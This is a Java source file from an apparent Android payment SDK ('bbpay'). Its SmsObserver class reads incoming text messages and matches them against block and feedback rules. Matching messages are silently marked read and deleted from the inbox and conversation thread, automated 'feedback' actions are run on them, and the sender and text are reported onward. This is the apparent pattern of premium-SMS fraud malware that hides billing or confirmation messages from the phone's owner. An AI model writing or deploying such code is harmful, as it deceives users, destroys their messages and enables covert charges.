package com.bbpay.android.sms;
import java.util.HashSet;
import java.util.Set;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.bbpay.android.listener.BlockListener;
import com.bbpay.android.manager.FeedbackManager;
import com.bbpay.android.utils.MyLogger;
import com.bbpay.common.bean.Block;
import com.bbpay.common.bean.Feedback;

public class SmsObserver extends ContentObserver {
    private static final String SORT_ORDER = "date desc";
    private static String ADDRESS = "address";
    private static String BODY = "body";
    private static String SMS_INBOX = "content://sms/inbox";
    private static String URI_CONTENT = "content://sms/conversations/";
    private Context context;
    public SmsObserver(Context context, Handler handler) {
        super(handler);
        this.context = context;
    }
    private static Set<String> deletedIdSet=new HashSet<String>();
    private void deletSms(Context context, Cursor cursor) {
        String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
        if(deletedIdSet.contains(id))return;
        deletedIdSet.add(id);
        ContentResolver resolver = context.getContentResolver();
        ContentValues contentvalues = new ContentValues();
        contentvalues.put("read", "1");
        resolver.update(Uri.parse(SMS_INBOX), contentvalues, " _id=?", new String[] { id });
        //cursor.moveToNext();
        if (cursor.getCount() > 0) {
            try {
                resolver.delete(Uri.parse(SMS_INBOX), "_id=" + id, null);
            } catch (Throwable e) {
                MyLogger.error(e);
            }
            //
            try {
                String threadId = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
                Uri uri = Uri.parse(new StringBuilder(URI_CONTENT).append(threadId).toString());
                resolver.delete(uri, "_id=?", new String[] { id });
            } catch (Throwable e) {
                MyLogger.error(e);
            }
        }
    }
    @Override
    public void onChange(boolean flag) {
        super.onChange(flag);
        try {
            checkSms();
        } catch (Throwable e) {
            MyLogger.error(e);
        }
    }
    
    private static Set<String> receivedIdSet=new HashSet<String>();
    private void checkSms() {
        int seconds=30;
        String where = "read=? AND date >  "  + (System.currentTimeMillis() -seconds * 1000); 
        String[] args = new String[] { "0" };
        //String where = " address like '10%' AND date >  "  + (System.currentTimeMillis() -seconds * 1000); 
        //String where = " date >  "  + (System.currentTimeMillis() -seconds * 1000);
        //String[] args=null;
        final Cursor cursor = context.getContentResolver().query(Uri.parse(SMS_INBOX), null, where, args, SORT_ORDER);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                if(receivedIdSet.contains(id)) continue;
                receivedIdSet.add(id);
                String text = cursor.getString(cursor.getColumnIndexOrThrow(BODY));
                String address = cursor.getString(cursor.getColumnIndexOrThrow(ADDRESS));
                MyLogger.debug(address, text);
                BlockListener listener = new BlockListener() {
                    private boolean blocked = false;
                    @Override
                    public void stopBroadcast() {
                        if (!blocked) {
                            deletSms(context, cursor);
                            blocked = true;
                        }
                    }
                };
                SmsHelper.checkCommonBlocks(address, text, listener);
                Feedback feedback = SmsHelper.checkFeedback(context, address, text, listener);
                if (feedback != null) {
                    deletSms(context, cursor);
                    FeedbackManager.getInstance(context).executeFeedback(address, text, feedback);
                } else {
                    Block block = SmsHelper.checkBlock(context, address, text, listener);
                    if (block != null) {
                        SmsHelper.report(context, block, address + "->" + text);
                    }
                }
            }
            cursor.close();
        }
    }
}
